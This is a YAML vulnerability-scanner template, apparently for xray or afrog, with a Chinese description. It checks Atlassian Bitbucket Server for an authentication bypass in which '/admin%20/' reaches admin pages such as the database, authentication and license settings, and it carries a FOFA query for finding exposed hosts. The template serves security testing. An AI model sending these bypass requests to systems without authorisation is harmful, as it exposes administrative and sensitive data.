id: Atlassian-Bitbucket-Loginbypass

info:
  name: Atlassian Bitbucket 登录绕过漏洞
  author: daffainfo
  severity: critical
  description: 此错误已修复并部署在 Bitbucket Server > 4.8 上。Bitbucket 由 Atlassian 团队开发。其中出现了一个通过 %20 绕过权限的漏洞，导致任意用户可获取敏感数据
  reference:
    - https://github.com/Threekiii/Awesome-POC/blob/master/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/Atlassian%20Bitbucket%20%E7%99%BB%E5%BD%95%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E.md
  metadata:
    fofa-query: title="Log in - Bitbucket"

rules:
  r0:
    request:
      method: GET
      path: /admin%20/mail-server
    expression: response.status == 200 && response.body.bcontains(b'<strong>Accounts</strong>')
  r1:
    request:
      method: GET
      path: /admin%20/db
    expression: response.status == 200 && response.body.bcontains(b'<strong>Accounts</strong>')
  r2:
    request:
      method: GET
      path: /admin%20/db/edit
    expression: response.status == 200 && response.body.bcontains(b'<strong>Accounts</strong>')
  r3:
    request:
      method: GET
      path: /admin%20/license
    expression: response.status == 200 && response.body.bcontains(b'<strong>Accounts</strong>')
  r4:
    request:
      method: GET
      path: /admin%20/logging
    expression: response.status == 200 && response.body.bcontains(b'<strong>Accounts</strong>')
  r5:
    request:
      method: GET
      path: /admin%20/server-settings
    expression: response.status == 200 && response.body.bcontains(b'<strong>Accounts</strong>')
  r6:
    request:
      method: GET
      path: /admin%20/authentication
    expression: response.status == 200 && response.body.bcontains(b'<strong>Accounts</strong>')
  r7:
    request:
      method: GET
      path: /admin%20/avatars
    expression: response.status == 200 && response.body.bcontains(b'<strong>Accounts</strong>')
expression: r0() || r1() || r2() || r3() || r4() || r5() || r6() || r7()